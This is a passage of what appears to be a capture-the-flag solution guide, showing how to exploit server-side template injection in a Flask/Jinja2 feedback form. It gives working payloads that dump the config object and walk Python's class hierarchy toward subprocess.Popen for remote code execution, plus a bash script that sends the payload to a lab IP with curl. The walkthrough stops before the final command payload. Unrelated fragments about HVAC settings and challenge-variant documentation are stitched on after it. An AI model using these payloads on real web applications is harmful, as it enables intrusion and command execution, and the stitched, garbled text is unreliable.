The first example returns the mathematical value of 7 * 7, which is equal to 49. Here is an image showing results:</p> <p></p> <p>Now we know the Feedback tab is vulnerable to SSTI. Create some \"proof-of-concepts\".</p> <p>Tip</p> <p>Tip!\u00a0Flask (Jinja2) uses Python, and in Python, everything is an object.</p> </li> <li> <p>Dump the contents of the config object by entering the following:\u00a0{{config.items()}}</p> <p>Here are the results:</p> <p></p> <p>That step reassures you that calling Python objects works here. Also, if a secret key was used, the secret key is shown using that command (however, there is no Secret key here).</p> </li> <li> <p>Let's try to exploit SSTI further. Start simple and build the payload up.</p> </li> <li> <p>Use the Python objects to navigate the inheritance tree. For this, we'll use mostly two classes:</p> <p><code>__mro__ / mro()</code>\u00a0(note the two underscores with\u00a0no\u00a0space in between)</p> <p><code>__subclasses__</code>\u00a0(again, note the two underscores with\u00a0no\u00a0space in between)</p> </li> <li> <p>Try to access the object base class. Create a new object using a simple integer (type\u00a0int). Here is an example of our payload:</p> <p><code>{{2022.__class__.__mro__}}</code></p> <p>And the result:\u00a0</p> <p></p> </li> <li> <p>Now, we want access to the root object class. Select the item at\u00a0index 1\u00a0and use\u00a0<code>__subclasses__()</code>\u00a0to list the classes available in the application. For example:\u00a0<code>{{2022.__class__.__mro__[1].__subclasses__()}}</code></p> <p>And the result:</p> <p></p> <p>Now you have a full list of all the classes available within the application. All apps are different, so they will be exploited differently. Like we previously mentioned, we developed this challenge so many different methods for exploitation could be employed; however, the focus of this challenge is on executing remote commands.</p> </li> <li> <p>We'll perform remote code execution (RCE) now. Find the following class:\u00a0subprocess.Popen. You can do this by pressing\u00a0ctrl+F\u00a0in the browser and searching for\u00a0subprocess.Popen. Note the index/position where it is found. You can count the classes one by one until you reach\u00a0subprocess.Popen, but this will take a long time. So, even though we are solving this challenge using the web interface, we will create a script to find the index more easily.</p> </li> </ol> <p>Here is our script:</p> <pre><code>    #!/bin/bash\n\n    ### STEP 1: Once you see all available classes in the application, copy and paste the website link and use it to make a curl like: \n\n    step_1=$(curl -o SSTI.txt http://10.10.10.110/feedback/?subject=%7B%7B2022.__class__.__mro__%5B1%5D.__subclasses__%28%29%7D%7D&amp;comments=Nothing%2C+really.%0D%0A%09%09)\n\n    ### STEP 2: This 'sed' command replaces each '&amp;lt;' with a new line which is equivalent to adding a new line before each '&lt;'. \n\n    step_2=$(sed 's/&amp;lt;/\\'$'\\n/g' SSTI.txt | tee SSTI_1.txt)\n\n    ### STEP 3: This 'sed' command deletes every line that doesn't contain 'class &amp;#39;' which is equivalent to the word 'class' and an apostrophe: class '\n\n    step_3=$(sed '/class &amp;#39;/!d' SSTI_1.txt | tee SSTI_2.txt)\n\n    ### STEP 4: This lets you know where `subprocess.Popen' is found. \n\n    step_4=$(sed -n '/subprocess.Popen/=' SSTI_2.txt)\n\n    sleep 1;\n\n    echo \"Performing curl. $step_1\"\n\n    echo \"Adding new line before each '&amp;lt;'. $step_2\" &gt; /dev/null 2&gt;&amp;1\n\n    echo \"Only adding lines that include 'class &amp;#39;' to a file. $step_3\" &gt; /dev/null 2&gt;&amp;1\n\n    echo -e \"Showing which line contains 'subprocess.Popen'. \\nThe result is line: $step_4\" \n</code></pre> <p>The result equals 312.

What this mean is that heating, cooling, fan, system and vents will all be turned on, which goes against the HVAC Instructions provided at the beginning of the solution guide.

For example, two competitors can attempt the same challenge, but one competitor may receive variant #1 and the other competitor may receive variant #2.  When creating a challenge using variants, make sure all variants test the same competitor skills at the same difficulty level. That is, variant #1 should test the same skills as variant #2 and one variant shouldn't be harder to solve than another variant.</p>"},{"location":"topomojo/challenge/#question-set","title":"Question Set","text":"<p>Move Up, Move Down, Remove: These functions are self-explanatory.
